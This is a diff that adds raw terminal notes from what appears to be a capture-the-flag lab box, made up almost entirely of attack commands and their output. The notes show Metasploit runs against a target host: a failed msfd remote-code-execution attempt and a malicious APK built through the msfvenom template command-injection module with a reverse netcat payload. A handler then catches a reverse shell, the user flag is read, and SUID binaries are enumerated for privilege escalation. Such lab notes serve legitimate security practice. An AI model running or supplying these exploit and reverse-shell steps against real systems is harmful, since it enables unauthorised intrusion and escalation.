@@ -49,6 +49,243 @@ hippoeug@kali:~$
 
 
 
+msf5 > use exploit/multi/misc/msfd_rce_remote
+[*] No payload configured, defaulting to generic/shell_reverse_tcp
+msf5 exploit(multi/misc/msfd_rce_remote) > show targets
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf5 exploit(multi/misc/msfd_rce_remote) > show options
+
+Module options (exploit/multi/misc/msfd_rce_remote):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   55554            yes       The target port (TCP)
+
+
+Payload options (generic/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.204.129  yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf5 exploit(multi/misc/msfd_rce_remote) > set rhost 10.129.72.251
+rhost => 10.129.72.251
+msf5 exploit(multi/misc/msfd_rce_remote) > set rport 5000
+rport => 5000
+msf5 exploit(multi/misc/msfd_rce_remote) > set lhost 10.10.14.12
+lhost => 10.10.14.12
+msf5 exploit(multi/misc/msfd_rce_remote) > run
+
+[-] Handler failed to bind to 10.10.14.12:4444:-  -
+[-] Handler failed to bind to 0.0.0.0:4444:-  -
+[-] 10.129.72.251:5000 - Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
+[*] Exploit completed, but no session was created.
+msf5 exploit(multi/misc/msfd_rce_remote) > show options
+
+Module options (exploit/multi/misc/msfd_rce_remote):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  10.129.72.251    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   5000             yes       The target port (TCP)
+
+
+Payload options (generic/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.14.12      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf5 exploit(multi/misc/msfd_rce_remote) > set lport 6969
+lport => 6969
+msf5 exploit(multi/misc/msfd_rce_remote) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.12:6969 
+[*] Exploit completed, but no session was created.
+msf5 exploit(multi/misc/msfd_rce_remote) > back
+
+
+
+
+
+
+
+msf6 > use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection
+[*] No payload configured, defaulting to cmd/unix/reverse_netcat
+msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > show options
+
+Module options (exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   FILENAME  msf.apk          yes       The APK file name
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.204.129  yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+   **DisablePayloadHandler: True   (no handler will be created!)**
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set lhost 10.10.14.12
+lhost => 10.10.14.12
+msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > exploit
+
+[+] msf.apk stored at /home/hippoeug/.msf4/local/msf.apk
+msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > back
+
+
+
+
+
+upload with lhost 10.10.14.12
+set android
+use apk template
+
+
+
+
+
+
+
+hippoeug@kali:~$ msfconsole
+                                                  
+# cowsay++
+ ____________
+< metasploit >
+ ------------
+       \   ,__,
+        \  (oo)____
+           (__)    )\
+              ||--|| *
+
+
+       =[ metasploit v6.0.29-dev                          ]
++ -- --=[ 2098 exploits - 1129 auxiliary - 357 post       ]
++ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: Open an interactive Ruby terminal with 
+irb
+
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set lhost 10.10.14.12
+lhost => 10.10.14.12
+msf6 exploit(multi/handler) > set lport 4444
+lport => 4444
+msf6 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.12:4444 
+[*] Command shell session 1 opened (10.10.14.12:4444 -> 10.129.72.251:58800) at 2021-02-07 17:06:55 +0800
+
+
+id
+uid=1000(kid) gid=1000(kid) groups=1000(kid)
+
+
+
+pwd
+/home/kid/html
+
+cd ..
+ls
+html
+logs
+snap
+user.txt
+cat user.txt
+05e59c0dba62dcb1bf331f88e92dcd16
+
+
+
+
+id
+uid=1000(kid) gid=1000(kid) groups=1000(kid)
+find / -perm -u=s -type f 2>/dev/null
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/chfn
+/usr/bin/fusermount
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/umount
+/usr/bin/sudo
+/usr/bin/gpasswd
+/usr/bin/at
+/snap/snapd/10707/usr/lib/snapd/snap-confine
+/snap/snapd/10492/usr/lib/snapd/snap-confine
+/snap/core18/1880/bin/mount
+/snap/core18/1880/bin/ping
+/snap/core18/1880/bin/su
+/snap/core18/1880/bin/umount
+/snap/core18/1880/usr/bin/chfn
+/snap/core18/1880/usr/bin/chsh
+/snap/core18/1880/usr/bin/gpasswd
+/snap/core18/1880/usr/bin/newgrp
+/snap/core18/1880/usr/bin/passwd
+/snap/core18/1880/usr/bin/sudo
+/snap/core18/1880/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core18/1880/usr/lib/openssh/ssh-keysign
+/snap/core18/1944/bin/mount
+/snap/core18/1944/bin/ping
+/snap/core18/1944/bin/su
+/snap/core18/1944/bin/umount
+/snap/core18/1944/usr/bin/chfn
+/snap/core18/1944/usr/bin/chsh
+/snap/core18/1944/usr/bin/gpasswd
+/snap/core18/1944/usr/bin/newgrp
+/snap/core18/1944/usr/bin/passwd
+/snap/core18/1944/usr/bin/sudo
+/snap/core18/1944/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core18/1944/usr/lib/openssh/ssh-keysign
+
+
+
 
 
 
